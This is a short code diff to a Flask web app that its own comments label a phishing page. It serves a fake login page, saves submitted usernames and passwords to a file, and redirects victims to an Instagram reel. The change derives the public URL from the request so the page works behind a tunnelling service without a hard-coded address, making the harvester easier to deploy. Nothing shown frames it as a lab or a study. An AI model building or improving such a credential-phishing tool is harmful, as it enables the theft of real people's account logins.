@@ -5,7 +5,10 @@ app = Flask(__name__)
 # Route for the phishing page
 @app.route('/')
 def phishing_page():
-    return render_template('login.html')
+    # Use the hostname from the incoming request so Quick Tunnel URLs
+    # never need to be hard-coded.
+    public_url = f"{request.scheme}://{request.host}"
+    return render_template('login.html', public_url=public_url)
 
 # Route to handle deep link
 @app.route('/short-url', methods=['GET', 'POST'])
@@ -16,7 +19,7 @@ def short_url():
             f.write(f'Username: {request.form["username"]}, Password: {request.form["password"]}\n')
         # Redirect to Instagram after saving credentials
         return redirect('https://www.instagram.com/reel/DdJyDTChRSi/')
-    return render_template('login.html')
+    return render_template('login.html', public_url=f"{request.scheme}://{request.host}")
 
 if __name__ == '__main__':
     app.run(debug=True)
